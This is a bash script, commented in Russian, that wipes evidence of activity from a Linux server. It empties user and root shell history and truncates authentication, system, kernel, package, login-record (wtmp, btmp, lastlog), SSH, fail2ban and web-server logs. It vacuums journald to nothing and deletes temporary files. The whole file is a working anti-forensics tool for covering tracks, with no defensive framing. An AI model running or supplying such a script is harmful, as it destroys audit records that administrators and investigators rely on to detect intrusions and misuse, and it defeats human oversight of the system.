#!/bin/bash

# Очистка истории bash
cat /dev/null > ~/.bash_history
history -c
history -w
sudo sh -c 'cat /dev/null > /root/.bash_history'
sudo sh -c 'history -c'

# Очистка основных системных логов
sudo truncate -s 0 /var/log/auth.log
sudo truncate -s 0 /var/log/syslog
sudo truncate -s 0 /var/log/kern.log
sudo truncate -s 0 /var/log/dpkg.log
sudo truncate -s 0 /var/log/apt/history.log 2>/dev/null
sudo truncate -s 0 /var/log/apt/term.log 2>/dev/null

# Очистка логов входов на сервер
sudo truncate -s 0 /var/log/wtmp
sudo truncate -s 0 /var/log/btmp
sudo truncate -s 0 /var/log/lastlog

# Очистка ротированных логов (если есть)
sudo truncate -s 0 /var/log/auth.log.* 2>/dev/null
sudo truncate -s 0 /var/log/syslog.* 2>/dev/null

# Очистка логов SSH
sudo truncate -s 0 /var/log/secure 2>/dev/null
sudo truncate -s 0 /var/log/messages 2>/dev/null

# Очистка логов fail2ban (если установлен)
sudo truncate -s 0 /var/log/fail2ban.log 2>/dev/null

# Очистка логов nginx/apache (если есть)
sudo truncate -s 0 /var/log/nginx/access.log 2>/dev/null
sudo truncate -s 0 /var/log/nginx/error.log 2>/dev/null
sudo truncate -s 0 /var/log/apache2/access.log 2>/dev/null
sudo truncate -s 0 /var/log/apache2/error.log 2>/dev/null

# Очистка journald
sudo journalctl --rotate 2>/dev/null
sudo journalctl --vacuum-size=1M 2>/dev/null
sudo journalctl --rotate 2>/dev/null
sudo journalctl --vacuum-time=1s 2>/dev/null

# Очистка временных файлов
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

# Очистка истории текущей сессии
history -c

# Скрытый вывод (без echo)
exit 0
